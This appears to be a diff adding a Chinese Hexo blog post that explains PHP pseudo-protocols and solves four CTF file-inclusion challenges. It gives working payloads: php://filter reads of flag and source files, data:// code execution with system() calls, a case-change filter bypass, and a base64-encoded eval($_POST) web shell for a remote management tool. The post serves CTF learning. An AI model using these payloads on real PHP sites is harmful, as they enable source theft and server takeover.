@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.11.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="php伪协议php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理，rot13处理等。官方解释为：php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="“phpfilter伪协议”">
+<meta property="og:url" content="http://example.com/2023/08/24/%E2%80%9Cphpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E2%80%9D/index.html">
+<meta property="og:site_name" content="临摹">
+<meta property="og:description" content="php伪协议php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理，rot13处理等。官方解释为：php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/1.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/3.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/5.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/6.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/8.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/9.png">
+<meta property="og:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/10.png">
+<meta property="article:published_time" content="2023-08-24T14:54:01.000Z">
+<meta property="article:modified_time" content="2023-08-24T17:01:52.004Z">
+<meta property="article:author" content="Justin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/1.png">
+
+
+<link rel="canonical" href="http://example.com/2023/08/24/%E2%80%9Cphpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E2%80%9D/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/08/24/%E2%80%9Cphpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E2%80%9D/","path":"2023/08/24/“phpfilter伪协议”/","title":"“phpfilter伪协议”"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>“phpfilter伪协议” | 临摹</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">临摹</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.</span> <span class="nav-text">php伪协议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#file%E5%8D%8F%E8%AE%AE"><span class="nav-number">2.</span> <span class="nav-text">file协议</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#include%E5%92%8Crequire%E5%87%BD%E6%95%B0"><span class="nav-number">3.</span> <span class="nav-text">include和require函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#include%E5%92%8Cinclude-once%E7%9A%84%E5%8C%BA%E5%88%AB-require%E4%B8%8Erequire-once%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-number">3.1.</span> <span class="nav-text">include和include_once的区别(require与require_once的区别)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file-get-contents"><span class="nav-number">3.2.</span> <span class="nav-text">file_get_contents</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E6%83%85%E5%86%B5"><span class="nav-number">4.</span> <span class="nav-text">具体情况</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%B3%951"><span class="nav-number">4.1.</span> <span class="nav-text">用法1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfileinclude%EF%BC%89"><span class="nav-number">4.2.</span> <span class="nav-text">例题1（攻防世界fileinclude）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%B3%952"><span class="nav-number">4.3.</span> <span class="nav-text">用法2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%982%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfileclude%EF%BC%89"><span class="nav-number">4.4.</span> <span class="nav-text">例题2（攻防世界fileclude）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%A8%E6%B3%953"><span class="nav-number">4.5.</span> <span class="nav-text">用法3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%983%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cfile-include"><span class="nav-number">4.6.</span> <span class="nav-text">例题3（攻防世界file_include)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BE%8B%E9%A2%984-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-php-include"><span class="nav-number">4.7.</span> <span class="nav-text">例题4(攻防世界Web_php_include)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0"><span class="nav-number">4.7.1.</span> <span class="nav-text">函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#strstr"><span class="nav-number">4.7.1.1.</span> <span class="nav-text">strstr()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#str-replace"><span class="nav-number">4.7.2.</span> <span class="nav-text">str_replace()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98"><span class="nav-number">4.7.3.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">4.7.3.1.</span> <span class="nav-text">利用php伪协议大小写绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">4.7.3.2.</span> <span class="nav-text">data伪协议代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BC%A0%E5%85%A5%E6%9C%A8%E9%A9%AC"><span class="nav-number">4.7.3.3.</span> <span class="nav-text">data伪协议传入木马</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Justin</p>
+  <div class="site-description" itemprop="description">适得浮生</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/24/%E2%80%9Cphpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE%E2%80%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Justin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="临摹">
+      <meta itemprop="description" content="适得浮生">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="“phpfilter伪协议” | 临摹">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          “phpfilter伪协议”
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-08-24 22:54:01" itemprop="dateCreated datePublished" datetime="2023-08-24T22:54:01+08:00">2023-08-24</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-08-25 01:01:52" itemprop="dateModified" datetime="2023-08-25T01:01:52+08:00">2023-08-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p><code>php://filter</code>是php中独有的<code>一种协议</code>，它是一种<code>过滤器</code>，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如<code>base64编码处理，rot13处理</code>等。官方解释为：<br>php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，<code>类似 readfile()、 file() 和 file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。<br>php:&#x2F;&#x2F;filter伪协议可以用于如下<code>函数</code>:</p>
+<span id="more"></span>
+<p>include()<br>include_once()<br>require ()<br>require_once<br>file()<br>readfile()<br>file_get_contents()<br>readfile()<br>highlight_file()<br>show_source()<br>fopen()<br>可以用于<code>读取、写入</code>文件等函数</p>
+<h1 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h1><p>用法：file:&#x2F;&#x2F;[本地文件系统的绝对路径]</p>
+<h1 id="include和require函数"><a href="#include和require函数" class="headerlink" title="include和require函数"></a>include和require函数</h1><p>通过 <code>include 或 require </code>语句，可将 PHP 文件内容插入另一个 PHP 文件(在服务器执行它之前)。<br>include 和 require 语句相同，但在错误处理方面：<br><code>require</code> 会生成<code>致命错误</code>，并停止脚本<br><code>include</code> 只生成<code>警告</code>，并且脚本会继续</p>
+<h2 id="include和include-once的区别-require与require-once的区别"><a href="#include和include-once的区别-require与require-once的区别" class="headerlink" title="include和include_once的区别(require与require_once的区别)"></a>include和include_once的区别(require与require_once的区别)</h2><p>区别是若该文件中的代码已经被包含了，则不会再次包含，只会包含一次。include_once(require_once)需要查询一遍已加载的文件列表, 确认是否存在, 然后再加载<br>include_once (require_once)语句在脚本执行期间包含并运行指定文件。此行为和 include (require)语句类似</p>
+<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>将文件中<code>数据提取为字符串</code>的函数，它与inclue()一样参数为文件名</p>
+<h1 id="具体情况"><a href="#具体情况" class="headerlink" title="具体情况"></a>具体情况</h1><h2 id="用法1"><a href="#用法1" class="headerlink" title="用法1"></a>用法1</h2><p><code>php://input</code>,用于<code>执行php代码</code>，需要<code>post</code>请求提交数据。<br>php:&#x2F;&#x2F;filter,用于<code>读取源码</code>，<code>get</code>提交参数。如:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=php://filter/read=convert.base64/resource=xxx.php</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</span><br></pre></td></tr></table></figure>
+<h2 id="例题1（攻防世界fileinclude）"><a href="#例题1（攻防世界fileinclude）" class="headerlink" title="例题1（攻防世界fileinclude）"></a>例题1（攻防世界fileinclude）</h2><p>由题意得，flag在<code>flag.php</code>文件里，所以要想办法来读取flag.php<br>还能看到一个文件路径 <code>/var/www/html/index.php </code><br>查看源代码：<br><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/1.png" alt="打开方式"><br>变量<code>$lan</code> 用 <code>$_COOKIE</code>传参。所以我们要<code>改cookie</code>的值<br>19行 @include(“english.php”)可以看出此处存在文件包含。<code>include函数</code>用<code>php://filter伪协议</code>来绕过<br>构造playload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag</span><br></pre></td></tr></table></figure>
+<p>注意playload最后面是flag，而不是flag.php。因为源代码23行 @include($lan.”.php”);已经做了.php拼接<br>接下来抓包：<br><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/2.png" alt="打开方式"><br><code>修改Cookie</code>的值：<br><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/3.png" alt="打开方式"><br>再Base64解码得到flag</p>
+<h2 id="用法2"><a href="#用法2" class="headerlink" title="用法2"></a>用法2</h2><p>data协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">data://text/plain;base64,xxxx(base64编码后的数据)</span><br></pre></td></tr></table></figure>
+<h2 id="例题2（攻防世界fileclude）"><a href="#例题2（攻防世界fileclude）" class="headerlink" title="例题2（攻防世界fileclude）"></a>例题2（攻防世界fileclude）</h2><p><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/4.png" alt="打开方式"><br><code>file_get_contents</code>是将文件中数据提取为字符串的函数，它与inclue()一样参数为文件名，所以直接file2&#x3D;hello%20ctf行不通，要用<code>data://协议</code>构造数据流，使它当作<code>php文件</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file2=data://text,plain,hello ctf</span><br></pre></td></tr></table></figure>
+<p>而file1和上一例题相同，构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file1=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="用法3"><a href="#用法3" class="headerlink" title="用法3"></a>用法3</h2><p><code>filter协议会被过滤</code>，这时就需要用到<code>转换过滤器</code><br><code>转换过滤器</code>:<br>如同 <code>string.* 过滤器，convert.*</code> 过滤器的作用就和其名字一样。<br>转换过滤器是 PHP 5.0.0 添加的。对于指定过滤器的更多信息，请参考该函数的手册页。<br>&lt;%- link_to(‘<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.convert.php&#39;">https://www.php.net/manual/zh/filters.convert.php&#39;</a>) %&gt;<br>在激活 <code>iconv</code> 的前提下可以使用 convert.iconv.* 压缩过滤器，<br>等同于用 iconv() 处理所有的流数据。 该过滤器<code>不支持参数</code>，<br><code>但可使用输入/输出的编码名称，组成过滤器名称</code><br>比如 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">或 convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt; </span><br></pre></td></tr></table></figure>
+<p>（两种写法的语义都相同）<br><code>php支持的编码格式(部分)</code><br>UCS-4*<br>UCS-4BE<br>UCS-4LE*<br>UCS-2<br>UCS-2BE<br>UCS-2LE</p>
+<h2 id="例题3（攻防世界file-include"><a href="#例题3（攻防世界file-include" class="headerlink" title="例题3（攻防世界file_include)"></a>例题3（攻防世界file_include)</h2><p><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/5.png" alt="打开方式"><br>发现伪协议行不通，肯定是被<code>过滤</code>了<br>于是构造url：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.iconv.a.b/resource=check.php</span><br></pre></td></tr></table></figure>
+<p>然后使用bp进行<code>爆破</code>：<br><code>选择a和b为payload发送到intruder进行爆破</code>：<br><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/6.png" alt="打开方式"><br>结果如下：<br><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/7.png" alt="打开方式"><br>选择一组，如<code>UTF-7和UTF-32*</code>进行带入，发现没有出现flag，推测flag在<code>flag.php</code>中：<br><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/8.png" alt="打开方式"><br>得到flag</p>
+<h2 id="例题4-攻防世界Web-php-include"><a href="#例题4-攻防世界Web-php-include" class="headerlink" title="例题4(攻防世界Web_php_include)"></a>例题4(攻防世界Web_php_include)</h2><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="strstr"><a href="#strstr" class="headerlink" title="strstr()"></a>strstr()</h4><p><code>定义和用法</code>：搜索字符串在另一个字符串中是否存在，如果是，返回字符串及剩余部分，否则返回false,<code>区分大小写</code><br><code>stristr()</code>函数<code>不区分大小写</code><br><code>语法</code>：<br>strstr(string,search,before_search)<br>string:必需，<code>被搜索的字符串</code><br>search:必需，<code>要搜索的字符串</code>，若是数字，则搜索对应的ASCII值的字符<br>before_search：可选，默认为“false”，若为true,将返回search参数第一次出现之前的字符串部分</p>
+<h3 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h3><p><code>定义和用法</code>：以其它字符替换字符串中的一些字符（区分大小写）<br><code>语法</code>：<br><code>str_replace</code>(find,replace,string,count)<br>find,必需，<code>要查找的值</code><br>replace，必需，<code>要替换的值</code><br>string，必需，<code>被搜索的字符串</code><br>count，可选，替换次数</p>
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/9.png" alt="打开方式"><br>总结：程序<code>过滤掉</code>了page&#x3D;参数传入<code>php://</code><br>可用以下方法</p>
+<h4 id="利用php伪协议大小写绕过"><a href="#利用php伪协议大小写绕过" class="headerlink" title="利用php伪协议大小写绕过"></a>利用php伪协议大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=PHP://input</span><br></pre></td></tr></table></figure>
+<p><img src="/image/phpfilter%E4%BC%AA%E5%8D%8F%E8%AE%AE/10.png" alt="打开方式"><br>得到文件后再<code>cat</code>，该用法在<code>php5.2以上已被禁用</code></p>
+<h4 id="data伪协议代码执行"><a href="#data伪协议代码执行" class="headerlink" title="data伪协议代码执行"></a>data伪协议代码执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data://text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到文件名后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=data://text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="data伪协议传入木马"><a href="#data伪协议传入木马" class="headerlink" title="data伪协议传入木马"></a>data伪协议传入木马</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[666]); ?&gt; </span><br></pre></td></tr></table></figure>
+<p>base64加密后与<code>data://text/plain,</code>拼接<br>例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==</span><br></pre></td></tr></table></figure><br>再用菜刀连接</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/21/%E2%80%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%9C/" rel="prev" title="”反序列化“">
+                  <i class="fa fa-chevron-left"></i> ”反序列化“
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Justin</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
